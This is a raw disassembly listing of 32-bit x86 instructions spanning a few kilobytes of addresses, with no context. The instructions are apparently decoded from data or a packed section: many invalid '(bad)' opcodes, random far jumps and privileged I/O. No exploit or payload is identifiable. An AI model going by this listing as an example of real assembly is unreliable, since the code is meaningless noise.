  41e374:	loopne 0x41e325
  41e376:	pop    edx
  41e377:	jecxz  0x41e320
  41e379:	xchg   BYTE PTR [edi-0x21],cl
  41e37c:	rcr    edx,1
  41e37e:	or     esi,DWORD PTR es:[ecx-0x95c88a3]
  41e385:	(bad)  
  41e386:	int3   
  41e387:	xor    DWORD PTR [ecx-0x3e],ebx
  41e38a:	inc    esi
  41e38b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e38c:	(bad)  
  41e38d:	stc    
  41e38e:	es scas al,BYTE PTR es:[edi]
  41e390:	neg    BYTE PTR [esi-0x654714d3]
  41e396:	shl    BYTE PTR [ebx+0x75992c42],cl
  41e39c:	in     al,dx
  41e39d:	out    dx,al
  41e39e:	aas    
  41e39f:	es push 0x41
  41e3a2:	dec    edi
  41e3a3:	rol    BYTE PTR [edi],0x9f
  41e3a6:	lods   al,BYTE PTR ds:[esi]
  41e3a7:	mov    ecx,0x4416c0a5
  41e3ac:	addr16 repz (bad) 
  41e3af:	int3   
  41e3b0:	jmp    0x7de5:0x24dbf587
  41e3b7:	or     eax,0x81f9447
  41e3bc:	stc    
  41e3bd:	js     0x41e432
  41e3bf:	inc    ebp
  41e3c0:	sub    dh,bl
  41e3c2:	xchg   ebx,eax
  41e3c3:	sub    dl,ah
  41e3c5:	loopne 0x41e441
  41e3c7:	inc    esi
  41e3c8:	adc    edx,esp
  41e3ca:	add    DWORD PTR [eax-0x74],edx
  41e3cd:	mov    ah,0xe3
  41e3cf:	jmp    0x6e45:0x776c1a30
  41e3d6:	push   esp
  41e3d7:	lea    ebx,[ebx+0x7557608b]
  41e3dd:	(bad)  
  41e3de:	adc    eax,0x21dbed2d
  41e3e3:	or     dh,BYTE PTR [ecx+0x5e]
  41e3e6:	in     al,dx
  41e3e7:	popf   
  41e3e8:	cli    
  41e3e9:	mov    al,ds:0x60cf940f
  41e3ee:	mov    WORD PTR [ecx-0x41],gs
  41e3f1:	cmp    edi,DWORD PTR [esi-0x4551fe9c]
  41e3f7:	push   esi
  41e3f8:	sbb    al,0xde
  41e3fa:	dec    ebx
  41e3fb:	dec    esp
  41e3fc:	xor    BYTE PTR [edx],cl
  41e3fe:	jb     0x41e415
  41e400:	test   eax,0x7c1fd62e
  41e405:	inc    edi
  41e406:	adc    BYTE PTR [eax+0x24],ch
  41e409:	xchg   ebp,eax
  41e40a:	jae    0x41e3ab
  41e40c:	call   0x74f8927d
  41e411:	ret    
  41e412:	cld    
  41e413:	add    DWORD PTR [ebp+0x68bff23a],ebp
  41e419:	out    dx,eax
  41e41a:	push   esp
  41e41b:	xchg   ecx,eax
  41e41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e41d:	push   ss
  41e41e:	das    
  41e41f:	mov    dh,0x5b
  41e421:	aad    0xd2
  41e423:	rcl    BYTE PTR [ebp-0x565b4450],0x82
  41e42a:	sub    DWORD PTR [ebp-0x67dd4e82],edx
  41e430:	fcomp  QWORD PTR ds:0xc4054384
  41e436:	push   ds
  41e437:	call   FWORD PTR [ecx-0x58]
  41e43a:	stos   DWORD PTR es:[edi],eax
  41e43b:	jmp    0x3001b07c
  41e440:	jg     0x41e3f9
  41e442:	mov    ebp,0xd55a4a64
  41e447:	je     0x41e49f
  41e449:	shl    bh,0xdb
  41e44c:	pop    ebx
  41e44d:	inc    esp
  41e44e:	adc    ebx,eax
  41e450:	arpl   WORD PTR [ebp-0x55bd92c9],cx
  41e456:	fisttp WORD PTR [edx]
  41e458:	cmp    dh,BYTE PTR [ebp+esi*2+0x1e5075c1]
  41e45f:	cdq    
  41e460:	dec    ecx
  41e461:	popf   
  41e462:	push   es
  41e463:	push   0x2
  41e465:	(bad)  
  41e466:	aam    0x5f
  41e468:	sti    
  41e469:	xchg   edi,eax
  41e46a:	inc    edi
  41e46b:	mov    eax,0xc913fb87
  41e470:	xlat   BYTE PTR ds:[ebx]
  41e471:	dec    ebp
  41e472:	pop    es
  41e473:	mov    ?,WORD PTR [ebp+ecx*8+0x27]
  41e477:	cs pop ss
  41e479:	fstp   DWORD PTR [ebp-0x70]
  41e47c:	mov    BYTE PTR ds:0x5f57c354,cl
  41e482:	(bad)  
  41e483:	cmp    ebp,DWORD PTR [edi-0x45]
  41e486:	add    dl,BYTE PTR [esp+edi*1]
  41e489:	jl     0x41e429
  41e48b:	ror    BYTE PTR [edx+0x40b25cce],0x48
  41e492:	sbb    dl,BYTE PTR ss:[edx+0x6]
  41e496:	lea    esp,[ebp-0x7c]
  41e499:	push   ebp
  41e49a:	inc    ebp
  41e49b:	and    BYTE PTR [eax],0xca
  41e49e:	mov    ecx,0x390a50f1
  41e4a3:	or     esp,esp
  41e4a5:	jg     0x41e4c3
  41e4a7:	dec    edi
  41e4a8:	xrelease xchg BYTE PTR [ebx+0x3e],al
  41e4ac:	out    dx,al
  41e4ad:	pushf  
  41e4ae:	mov    ebx,0x1048038a
  41e4b3:	pop    esp
  41e4b4:	xlat   BYTE PTR ds:[ebx]
  41e4b5:	pop    ss
  41e4b6:	aam    0xc8
  41e4b8:	call   0xe91807fc
  41e4bd:	fcom   st(5)
  41e4bf:	shl    BYTE PTR [ecx*1-0xa06bd1c],cl
  41e4c6:	sub    dh,dl
  41e4c8:	mov    eax,0x881e2b28
  41e4cd:	retf   
  41e4ce:	in     al,dx
  41e4cf:	mov    ch,0x3d
  41e4d1:	pop    es
  41e4d2:	shl    ch,1
  41e4d4:	push   cs
  41e4d5:	aas    
  41e4d6:	pushf  
  41e4d7:	dec    ebp
  41e4d8:	test   eax,0xbcb505b5
  41e4dd:	add    BYTE PTR [ebp-0x6f],bl
  41e4e0:	inc    eax
  41e4e1:	push   ebx
  41e4e2:	cdq    
  41e4e3:	(bad)  
  41e4e4:	fadd   QWORD PTR [ebp+0x18]
  41e4e7:	imul   eax,DWORD PTR [eax-0x2e29cc75],0x1748494f
  41e4f1:	out    0xdb,eax
  41e4f3:	fwait
  41e4f4:	xchg   bl,dl
  41e4f6:	in     eax,0xbd
  41e4f8:	out    0x31,eax
  41e4fa:	xor    al,0xb5
  41e4fc:	loop   0x41e55e
  41e4fe:	mov    ah,0x3d
  41e500:	fimul  WORD PTR [ecx+ebp*1-0x25f38802]
  41e507:	push   ebp
  41e508:	mov    dl,BYTE PTR [ecx+0x7e]
  41e50b:	push   cs
  41e50c:	test   eax,0x6afcae5d
  41e511:	sub    ecx,DWORD PTR [ebp-0x52]
  41e514:	pop    esi
  41e515:	ins    BYTE PTR es:[edi],dx
  41e516:	aaa    
  41e517:	push   esp
  41e518:	dec    esp
  41e519:	push   edx
  41e51a:	dec    edx
  41e51b:	nop
  41e51c:	pop    eax
  41e51d:	sbb    DWORD PTR [ecx],ebx
  41e51f:	add    bh,BYTE PTR ds:0x3aacd9b3
  41e525:	leave  
  41e526:	xchg   dh,bl
  41e528:	repnz sub esp,eax
  41e52b:	es push ss
  41e52d:	pop    es
  41e52e:	jmp    0x2e98:0x968b99dc
  41e535:	out    0x2a,al
  41e537:	in     al,0x23
  41e539:	mov    ebp,0x1175691d
  41e53e:	sar    BYTE PTR [ebx+0x11],0xc2
  41e542:	adc    eax,0x4779c755
  41e547:	loope  0x41e551
  41e549:	ins    DWORD PTR es:[edi],dx
  41e54a:	mov    ch,0xcb
  41e54c:	mov    ?,WORD PTR [eax+0x28]
  41e54f:	mov    bl,0x18
  41e551:	pop    es
  41e552:	xor    edi,DWORD PTR [edi]
  41e554:	cmp    ebx,DWORD PTR [edi+0x16]
  41e557:	sub    BYTE PTR ds:0x65c7c883,dl
  41e55d:	mov    edi,0xe83beec2
  41e562:	pusha  
  41e563:	push   edi
  41e564:	add    eax,0x9e309a07
  41e569:	jmp    0xce98c0e4
  41e56e:	or     dh,BYTE PTR [eax-0x6bf3664b]
  41e574:	lods   eax,DWORD PTR ds:[esi]
  41e575:	add    al,BYTE PTR [ecx]
  41e577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e578:	dec    esi
  41e579:	inc    ecx
  41e57a:	adc    BYTE PTR [esp+eiz*2+0x6],cl
  41e57e:	rcr    bl,1
  41e580:	lods   al,BYTE PTR ds:[esi]
  41e581:	div    BYTE PTR [ebx-0x667d08a1]
  41e587:	mov    ecx,0x9b2ea395
  41e58c:	push   ebp
  41e58d:	jp     0x41e543
  41e58f:	je     0x41e53a
  41e591:	dec    edx
  41e592:	dec    eax
  41e593:	repnz std 
  41e595:	push   ss
  41e596:	pop    esi
  41e597:	ret    0xed7e
  41e59a:	cmc    
  41e59b:	or     bh,BYTE PTR [ecx+0xe]
  41e59e:	push   esp
  41e59f:	jnp    0x41e549
  41e5a1:	mov    esi,0xedd220f7
  41e5a6:	push   0x41
  41e5a8:	cmc    
  41e5a9:	cmp    DWORD PTR [eax-0x75],0xfee8384a
  41e5b0:	cli    
  41e5b1:	ins    DWORD PTR es:[edi],dx
  41e5b2:	sub    BYTE PTR [esi],ah
  41e5b4:	xor    ebp,DWORD PTR [esi-0x47]
  41e5b7:	mov    ds:0xc7fd8664,al
  41e5bc:	sub    eax,0x521991ec
  41e5c1:	sub    al,0x76
  41e5c3:	inc    esi
  41e5c4:	and    eax,0x340499a8
  41e5c9:	rcr    esi,0x4
  41e5cc:	jb     0x41e580
  41e5ce:	cmp    ebp,DWORD PTR [ebp+eiz*2-0x4f]
  41e5d2:	sbb    bh,BYTE PTR [ecx]
  41e5d4:	sbb    cl,bh
  41e5d6:	mov    al,ds:0x7ad7e3f7
  41e5db:	push   cs
  41e5dc:	cmp    al,0x46
  41e5de:	scas   al,BYTE PTR es:[edi]
  41e5df:	mov    dh,0x87
  41e5e1:	mov    dl,0x50
  41e5e3:	fstp   QWORD PTR [ebp+esi*2-0x6a]
  41e5e7:	mov    al,0x5d
  41e5e9:	je     0x41e5b9
  41e5eb:	call   0x86d32939
  41e5f0:	jno    0x41e624
  41e5f2:	dec    esi
  41e5f3:	and    eax,DWORD PTR [esi+0x4d]
  41e5f6:	fcomip st,st(7)
  41e5f8:	pop    edx
  41e5f9:	push   ds
  41e5fa:	dec    ebp
  41e5fb:	sub    esi,DWORD PTR [eax]
  41e5fd:	inc    esp
  41e5fe:	mov    edx,0x24e2c20f
  41e603:	clc    
  41e604:	mov    ah,0x63
  41e606:	mov    BYTE PTR ds:[edi+ebp*1-0x7db6f02f],0x14
  41e60f:	je     0x41e5aa
  41e611:	sbb    al,0x3d
  41e613:	jno    0x41e645
  41e615:	fwait
  41e616:	adc    DWORD PTR ds:0x228efab8,edx
  41e61c:	mov    eax,ds:0x7164cf5a
  41e621:	sbb    DWORD PTR [ecx+0x24],edx
  41e624:	ret    0x9f34
  41e627:	popa   
  41e628:	mov    ecx,0x4d395ee7
  41e62d:	or     eax,0xfe11a685
  41e632:	clc    
  41e633:	jl     0x41e61e
  41e635:	pop    ds
  41e636:	inc    edx
  41e637:	push   ebp
  41e638:	test   eax,0xfd2cf3fb
  41e63d:	mov    ebp,0x4649023b
  41e642:	pop    edx
  41e643:	test   al,0xc4
  41e645:	call   0xaf24:0x479a113c
  41e64c:	dec    esp
  41e64d:	jmp    0x41e6c7
  41e64f:	shl    BYTE PTR [ebx-0x4b],cl
  41e652:	jmp    0xe4e8:0x6653953d
  41e659:	xchg   DWORD PTR [edi-0x33],ecx
  41e65c:	icebp  
  41e65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e65e:	lods   eax,DWORD PTR ds:[esi]
  41e65f:	lds    eax,FWORD PTR [ecx+0x7]
  41e662:	xchg   ebp,eax
  41e663:	shl    BYTE PTR [edi],cl
  41e665:	or     esp,edx
  41e667:	clc    
  41e668:	imul   edi,ecx,0xf
  41e66b:	xchg   DWORD PTR [ecx+0x2e50a218],edi
  41e671:	pop    edi
  41e672:	adc    ecx,DWORD PTR [edx]
  41e674:	fisubr WORD PTR [edx+eax*1+0x752f2752]
  41e67b:	cld    
  41e67c:	pop    ss
  41e67d:	adc    DWORD PTR [esi-0x3b3aac77],ecx
  41e683:	adc    cl,BYTE PTR [edi-0x5a]
  41e686:	push   ecx
  41e687:	jb     0x41e701
  41e689:	in     al,dx
  41e68a:	(bad)  [edx+0x67]
  41e68d:	push   esi
  41e68e:	dec    ebx
  41e68f:	xor    al,0x6
  41e691:	in     eax,0xc9
  41e693:	clc    
  41e694:	pushf  
  41e695:	scas   eax,DWORD PTR es:[edi]
  41e696:	dec    esi
  41e697:	lock jg 0x41e650
  41e69a:	mov    cl,BYTE PTR [edx]
  41e69c:	dec    ebp
  41e69d:	fs fdivr st,st(5)
  41e6a0:	test   BYTE PTR [esi+0x31],al
  41e6a3:	pxor   mm0,mm1
  41e6a6:	push   es
  41e6a7:	xor    al,0xb7
  41e6a9:	nop
  41e6aa:	jle    0x41e6d4
  41e6ac:	stos   DWORD PTR es:[edi],eax
  41e6ad:	ror    BYTE PTR [ebp-0x3],0xb3
  41e6b1:	or     BYTE PTR [edi+0x2f],0x6c
  41e6b5:	add    edx,DWORD PTR [edx+0x53247756]
  41e6bb:	scas   al,BYTE PTR es:[edi]
  41e6bc:	add    bh,BYTE PTR [ecx-0x53ff2f3c]
  41e6c2:	add    DWORD PTR [ebx+edi*4-0x6d],esp
  41e6c6:	repz jmp 0x2c90:0xe3e25b0
  41e6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6cf:	aam    0x4b
  41e6d1:	or     ebp,ecx
  41e6d3:	sub    al,0xa4
  41e6d5:	aam    0x49
  41e6d7:	sbb    al,0x99
  41e6d9:	and    al,0xf6
  41e6db:	sbb    BYTE PTR [ebx+0x50],dh
  41e6de:	fadd   DWORD PTR [edx-0x80]
  41e6e1:	aam    0x6
  41e6e3:	mov    ecx,0x4a0422d8
  41e6e8:	xor    ebx,DWORD PTR [ecx+0x4a69d10]
  41e6ee:	dec    ebp
  41e6ef:	stc    
  41e6f0:	and    eax,0x7e84ba3c
  41e6f5:	sbb    eax,0xda260e7
  41e6fa:	inc    ebp
  41e6fb:	test   eax,0xf2acbaf7
  41e700:	ss aam 0x1f
  41e703:	(bad)  
  41e704:	retf   
  41e705:	mov    ah,0x77
  41e707:	mov    ds:0xb932fc53,al
  41e70c:	inc    esi
  41e70d:	retf   0x43fa
  41e710:	rol    BYTE PTR [ebx+0x51d28ebe],1
  41e716:	mov    esp,0xee457612
  41e71b:	shl    BYTE PTR [ebp+0x43],0x74
  41e71f:	mov    cl,0xc2
  41e721:	call   0x72659db3
  41e726:	out    0xcb,eax
  41e728:	cld    
  41e729:	dec    edi
  41e72a:	nop
  41e72b:	dec    eax
  41e72c:	pop    edx
  41e72d:	jo     0x41e757
  41e72f:	jne    0x41e728
  41e731:	fisubr DWORD PTR [edx]
  41e733:	pop    esi
  41e734:	pop    ecx
  41e735:	call   DWORD PTR [eax-0x1c]
  41e738:	fs ret 
  41e73a:	cmp    esp,DWORD PTR ds:0xedea4b8c
  41e740:	adc    bh,BYTE PTR [edx-0x17]
  41e743:	mov    BYTE PTR [esi+0x88b9170],bl
  41e749:	retf   0xfbeb
  41e74c:	dec    eax
  41e74d:	add    eax,0x8f60683
  41e752:	icebp  
  41e753:	pop    edi
  41e754:	sbb    al,0x28
  41e756:	call   0x5ca5:0xa666b655
  41e75d:	push   ebp
  41e75e:	pop    ds
  41e75f:	pop    edx
  41e760:	mov    BYTE PTR [eax-0x1c],ah
  41e763:	stos   BYTE PTR es:[edi],al
  41e764:	out    0x1a,ax
  41e767:	jge    0x41e795
  41e769:	add    ebx,0x7a
  41e76c:	and    DWORD PTR [eax+ebp*4+0x1210229f],edx
  41e773:	xchg   ecx,eax
  41e774:	loope  0x41e7ad
  41e776:	push   ecx
  41e777:	push   ebp
  41e778:	lahf   
  41e779:	lea    edx,[esi-0x22]
  41e77c:	or     BYTE PTR [ecx],bl
  41e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e77f:	dec    esi
  41e780:	shl    DWORD PTR [eax+0x334b89dd],1
  41e786:	test   DWORD PTR [eax-0x3ad2760d],edx
  41e78c:	jb     0x41e70e
  41e78e:	mov    ds,WORD PTR [esi+0xd63f12]
  41e794:	outs   dx,BYTE PTR ds:[esi]
  41e795:	shl    DWORD PTR [ebp-0x2d],1
  41e798:	shr    dh,0x48
  41e79b:	sbb    ecx,DWORD PTR [esi+edx*2+0x512d8832]
  41e7a2:	call   0x83f88a3d
  41e7a7:	cmp    eax,0xb5a662f0
  41e7ac:	int    0xdc
  41e7ae:	scas   al,BYTE PTR es:[edi]
  41e7af:	out    dx,eax
  41e7b0:	in     al,0xcf
  41e7b2:	cmc    
  41e7b3:	outs   dx,BYTE PTR ds:[esi]
  41e7b4:	and    bl,BYTE PTR [ecx-0x3a5e857c]
  41e7ba:	mov    ch,0x11
  41e7bc:	test   eax,0xc70b0220
  41e7c1:	inc    esi
  41e7c2:	adc    edi,ebp
  41e7c4:	mov    ds:0xf582f1c,al
  41e7c9:	std    
  41e7ca:	jno    0x41e81a
  41e7cc:	call   0x337b:0xeac79850
  41e7d3:	xchg   cl,bl
  41e7d5:	jp     0x41e855
  41e7d7:	xchg   ebp,eax
  41e7d8:	sbb    eax,0x27282f38
  41e7dd:	dec    esi
  41e7de:	or     eax,0x6d59799c
  41e7e3:	jl     0x41e77a
  41e7e5:	sar    DWORD PTR [ecx+eiz*4-0x65],0x93
  41e7ea:	scas   al,BYTE PTR es:[edi]
  41e7eb:	mov    ebp,0xde7133d9
  41e7f0:	pop    ebp
  41e7f1:	cld    
  41e7f2:	loop   0x41e862
  41e7f4:	dec    edi
  41e7f5:	jo     0x41e787
  41e7f7:	adc    BYTE PTR [edi],dl
  41e7f9:	aad    0x3c
  41e7fb:	jne    0x41e79d
  41e7fd:	pushf  
  41e7fe:	jmp    0x13fe:0x44785504
  41e805:	adc    eax,0x55b5eea6
  41e80a:	int    0xec
  41e80c:	pop    esp
  41e80d:	(bad)  
  41e80e:	fidiv  DWORD PTR [esp+eax*2+0x27]
  41e812:	ins    DWORD PTR es:[edi],dx
  41e813:	push   edx
  41e814:	stos   DWORD PTR es:[edi],eax
  41e815:	add    ax,0x467e
  41e819:	mov    esi,0xf3f7a67e
  41e81e:	dec    eax
  41e81f:	pop    ss
  41e820:	push   0xce208fb5
  41e825:	std    
  41e826:	pop    ebp
  41e827:	adc    BYTE PTR [esi],dl
  41e829:	cmc    
  41e82a:	pop    es
  41e82b:	jg     0x41e890
  41e82d:	xchg   BYTE PTR [ebp-0x74],al
  41e830:	inc    ecx
  41e831:	or     eax,0x8aab7d31
  41e836:	adc    DWORD PTR [ebp-0xc],0xffffffc1
  41e83a:	iret   
  41e83b:	inc    edi
  41e83c:	sub    eax,0xc3eabf6d
  41e841:	(bad)  
  41e842:	cld    
  41e843:	add    eax,0x359cc9ad
  41e848:	int    0x5b
  41e84a:	ror    esp,cl
  41e84c:	arpl   WORD PTR [esi-0x6d0c4370],di
  41e852:	mov    ds:0x98dc8f4f,eax
  41e857:	(bad)  
  41e858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e859:	lods   eax,DWORD PTR ds:[esi]
  41e85a:	in     al,dx
  41e85b:	mov    cs,WORD PTR [esp+edx*4+0x1b]
  41e85f:	jl     0x41e8d6
  41e861:	out    0x95,eax
  41e863:	call   0x306:0x6ac25ec9
  41e86a:	add    DWORD PTR [ebx+0x2d4230c1],0xd356cfbc
  41e874:	mov    ah,0x61
  41e876:	and    DWORD PTR [ebp-0x36],ebx
  41e879:	add    eax,0xeb9cfe4e
  41e87e:	cmp    ch,cl
  41e880:	xlat   BYTE PTR ds:[ebx]
  41e881:	xchg   edi,eax
  41e882:	dec    esi
  41e883:	gs dec esi
  41e885:	dec    ebx
  41e886:	jae    0x41e8ca
  41e888:	leave  
  41e889:	iret   
  41e88a:	gs push edi
  41e88c:	mov    esp,0x7f843d56
  41e891:	push   eax
  41e892:	inc    ecx
  41e893:	pop    ds
  41e894:	dec    esi
  41e895:	mov    al,0xc
  41e897:	and    eax,0xa0b6b040
  41e89c:	imul   eax,esp,0x26
  41e89f:	or     BYTE PTR [eax],bl
  41e8a1:	ret    0xd035
  41e8a4:	lock adc edx,edi
  41e8a7:	pop    esi
  41e8a8:	xor    DWORD PTR [eax-0x44be2386],0xffffffbe
  41e8af:	iret   
  41e8b0:	(bad)  
  41e8b1:	push   ecx
  41e8b2:	fwait
  41e8b3:	pop    esi
  41e8b4:	jns    0x41e906
  41e8b6:	xchg   BYTE PTR [ebx],al
  41e8b8:	push   0xbf03d860
  41e8bd:	mov    edi,0x546ae0e0
  41e8c2:	scas   eax,DWORD PTR es:[edi]
  41e8c3:	out    dx,eax
  41e8c4:	add    dl,bl
  41e8c6:	or     DWORD PTR [edi+ebx*4+0x37],edx
  41e8ca:	add    bh,BYTE PTR [esi+edx*2+0x1ed128e1]
  41e8d1:	push   esi
  41e8d2:	stc    
  41e8d3:	xchg   edi,eax
  41e8d4:	fild   QWORD PTR [ebp+0x39]
  41e8d7:	cmp    al,0x23
  41e8d9:	push   ss
  41e8da:	xchg   ecx,eax
  41e8db:	mov    eax,0x8a2da196
  41e8e0:	aam    0x91
  41e8e2:	mov    ebx,0x332ed935
  41e8e7:	inc    esp
  41e8e9:	gs lahf 
  41e8eb:	dec    eax
  41e8ec:	test   DWORD PTR [edi+0x7765a5ca],0x99486c9f
  41e8f6:	mov    DWORD PTR [edx-0xc],ebx
  41e8f9:	loopne 0x41e940
  41e8fb:	adc    al,0xe6
  41e8fd:	mov    ebp,0x48f78a42
  41e902:	sub    BYTE PTR [ebx],0x3d
  41e905:	xchg   esp,eax
  41e906:	or     ch,BYTE PTR [ecx]
  41e908:	sub    ecx,eax
  41e90a:	push   0xffffff9d
  41e90c:	cmp    al,dh
  41e90e:	in     eax,dx
  41e90f:	pop    ecx
  41e910:	not    BYTE PTR [eax-0x75]
  41e913:	push   cs
  41e914:	cld    
  41e915:	push   edx
  41e916:	ret    
  41e917:	rcl    BYTE PTR [ebx-0x344abe8e],1
  41e91d:	xor    cl,0x78
  41e920:	cmp    al,0xfe
  41e922:	out    dx,al
  41e923:	and    ebx,DWORD PTR [ebx+edi*1+0x3c]
  41e927:	in     eax,dx
  41e928:	dec    ebp
  41e929:	xchg   BYTE PTR [esi-0x4fe037f6],bl
  41e92f:	sub    al,0xc8
  41e931:	push   edx
  41e932:	mov    esi,0x2bb5692e
  41e937:	dec    ebx
  41e938:	jb     0x41e95b
  41e93a:	hlt    
  41e93b:	xchg   BYTE PTR [edi+ebp*4+0x1b],ch
  41e93f:	nop
  41e940:	and    esi,DWORD PTR [ecx]
  41e942:	mov    WORD PTR [ebx+0x1384f3c0],gs
  41e948:	js     0x41e97b
  41e94a:	dec    edx
  41e94b:	out    0x49,al
  41e94d:	daa    
  41e94e:	imul   ecx,DWORD PTR [esi+0x13a02c05],0xffffffa4
  41e955:	mov    ds:0xf68ff31c,al
  41e95a:	fsubr  DWORD PTR gs:[ebx+0x7bbdf4]
  41e961:	add    BYTE PTR [eax],al
  41e963:	add    BYTE PTR [eax],al
  41e965:	add    BYTE PTR [edi-0x1ab332f],ch
  41e96b:	pop    ebp
  41e96c:	mov    edi,0x5e13fbfb
  41e971:	cmp    DWORD PTR [ecx+edi*2+0x53],esp
  41e975:	mov    dh,0x49
  41e977:	loop   0x41e97a
  41e979:	add    BYTE PTR [edx],ah
  41e97b:	pop    es
  41e97c:	add    BYTE PTR [eax],al
  41e97e:	pop    ss
  41e97f:	shl    ebp,0xe3
  41e982:	lahf   
  41e983:	push   ebp
  41e984:	jb     0x41e9dc
  41e986:	ins    DWORD PTR es:[edi],dx
  41e987:	and    edi,edx
  41e989:	lds    edi,FWORD PTR [ebp-0x15aea778]
  41e98f:	mov    bh,0x35
  41e991:	leave  
  41e992:	sbb    BYTE PTR [esi+eax*2-0x6f827fb5],bl
  41e999:	les    ecx,FWORD PTR [edi]
  41e99b:	into   
  41e99c:	into   
  41e99d:	jg     0x41e9f1
  41e99f:	pop    cx
  41e9a1:	dec    eax
  41e9a2:	pop    ds
  41e9a3:	rcl    DWORD PTR [edx-0x7e],1
  41e9a6:	hlt    
  41e9a7:	xchg   ebp,eax
  41e9a8:	xor    bh,BYTE PTR [ecx+0x22]
  41e9ab:	add    al,0x76
  41e9ad:	adc    eax,0x6a4681d8
  41e9b2:	sub    esi,DWORD PTR [ecx+0xb8c2d6c]
  41e9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b9:	int3   
  41e9ba:	cmp    al,0xa1
  41e9bc:	pop    ecx
  41e9bd:	stc    
  41e9be:	pminsw mm7,mm5
  41e9c1:	xchg   ecx,eax
  41e9c2:	inc    esp
  41e9c3:	push   ebp
  41e9c4:	xchg   ecx,eax
  41e9c5:	sub    ch,al
  41e9c7:	xlat   BYTE PTR ds:[ebx]
  41e9c8:	sar    esp,cl
  41e9ca:	out    0xf7,al
  41e9cc:	xor    BYTE PTR [ecx-0x77],ch
  41e9cf:	jne    0x41e98c
  41e9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d2:	sub    BYTE PTR [edi+ebp*8+0x78],dh
  41e9d6:	inc    ebx
  41e9d7:	cli    
  41e9d8:	enter  0x98df,0x74
  41e9dc:	daa    
  41e9dd:	adc    eax,0x6c3a2c29
  41e9e2:	sub    cl,BYTE PTR [ebx-0x3f]
  41e9e5:	xor    DWORD PTR ds:0xe39ad4f2,edi
  41e9ec:	pop    edx
  41e9ed:	dec    esp
  41e9ee:	stos   BYTE PTR es:[edi],al
  41e9ef:	fisttp DWORD PTR [ebx+0x57d491e9]
  41e9f5:	mov    ch,0x32
  41e9f7:	xchg   ebp,eax
  41e9f8:	popa   
  41e9f9:	jbe    0x41e996
  41e9fb:	adc    eax,0xd71496e0
  41ea00:	or     dh,ch
  41ea02:	xor    dh,dh
  41ea04:	mov    edx,DWORD PTR [edx+0xc0cfc83]
  41ea0a:	das    
  41ea0b:	xchg   ebp,eax
  41ea0c:	mov    ah,0xce
  41ea0e:	or     al,0xbc
  41ea10:	in     al,0x2
  41ea12:	pop    edx
  41ea13:	inc    ebp
  41ea14:	loope  0x41ea90
  41ea16:	cmp    BYTE PTR [esi-0x72],dh
  41ea19:	dec    ecx
  41ea1a:	jne    0x41ea1d
  41ea1c:	enter  0xae40,0x2b
  41ea20:	or     DWORD PTR [edi-0x3d],edi
  41ea23:	jo     0x41e9e6
  41ea25:	cmp    al,0x5f
  41ea27:	push   ss
  41ea28:	stos   BYTE PTR es:[edi],al
  41ea29:	pop    edi
  41ea2a:	xchg   ecx,eax
  41ea2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea2c:	adc    al,ah
  41ea2e:	aad    0x96
  41ea30:	cld    
  41ea31:	das    
  41ea32:	test   BYTE PTR [ebp+ecx*1+0x47e28beb],cl
  41ea39:	loope  0x41ea5c
  41ea3b:	dec    ebp
  41ea3c:	jno    0x41e9c4
  41ea3e:	jle    0x41e9d7
  41ea40:	mov    BYTE PTR [eax],bl
  41ea42:	jl     0x41ea32
  41ea44:	mov    al,ds:0xae0f6031
  41ea49:	push   0xd5520427
  41ea4e:	pop    edi
  41ea4f:	add    bh,BYTE PTR [eax+0x47]
  41ea52:	int3   
  41ea53:	call   0x4b77:0x89fb32cd
  41ea5a:	mov    ebx,0x5c7235bb
  41ea5f:	enter  0xee1d,0xd0
  41ea63:	(bad)
  41ea66:	popf   
  41ea67:	or     BYTE PTR [eax+ebx*1+0x54],0xd2
  41ea6c:	push   ebp
  41ea6d:	pop    edi
  41ea6e:	xor    bh,BYTE PTR [edx-0x53]
  41ea71:	push   eax
  41ea72:	inc    ebp
  41ea73:	inc    eax
  41ea74:	jb     0x41ea16
  41ea76:	fwait
  41ea77:	cld    
  41ea78:	imul   esi,ebp,0x10
  41ea7b:	stos   BYTE PTR es:[edi],al
  41ea7c:	test   eax,ebx
  41ea7e:	sar    BYTE PTR [edx+0x303aacd2],cl
  41ea84:	inc    BYTE PTR [edx-0x2af9bcc8]
  41ea8a:	xchg   esp,eax
  41ea8b:	mov    eax,DWORD PTR [eax-0x4d489fb0]
  41ea91:	gs call 0x32a93f52
  41ea97:	and    BYTE PTR [ebp+0x24207296],al
  41ea9d:	pop    ebp
  41ea9e:	std    
  41ea9f:	pusha  
  41eaa0:	out    0x4a,eax
  41eaa2:	sbb    ebp,esp
  41eaa4:	loopne 0x41eafd
  41eaa6:	call   0xa3babd86
  41eaab:	xchg   edx,eax
  41eaac:	inc    edi
  41eaad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaae:	imul   ecx,DWORD PTR [edi+ebx*4],0x2b
  41eab2:	inc    ebp
  41eab3:	xor    al,BYTE PTR [ebx]
  41eab5:	pusha  
  41eab6:	and    DWORD PTR [eax-0x22],ebx
  41eab9:	inc    edx
  41eaba:	neg    DWORD PTR ds:0x563f9c64
  41eac0:	jne    0x41ea49
  41eac2:	pop    ss
  41eac3:	sub    edx,esp
  41eac5:	arpl   WORD PTR [edx-0x69f371cd],ax
  41eacb:	lods   al,BYTE PTR ds:[esi]
  41eacc:	sub    esp,ebx
  41eace:	xor    al,0xbd
  41ead0:	inc    esp
  41ead1:	cli    
  41ead2:	inc    esi
  41ead3:	sar    BYTE PTR [esi-0x52],0x21
  41ead7:	fmul   QWORD PTR [eax]
  41ead9:	xchg   edx,eax
  41eada:	ret    
  41eadb:	adc    BYTE PTR [ecx],0x7d
  41eade:	outs   dx,BYTE PTR ds:[esi]
  41eadf:	pushf  
  41eae0:	jo     0x41eb0f
  41eae2:	shl    BYTE PTR [edi],0xe6
  41eae5:	mov    al,0xaf
  41eae7:	mov    DWORD PTR [edi+esi*8],0xba8c9b1e
  41eaee:	std    
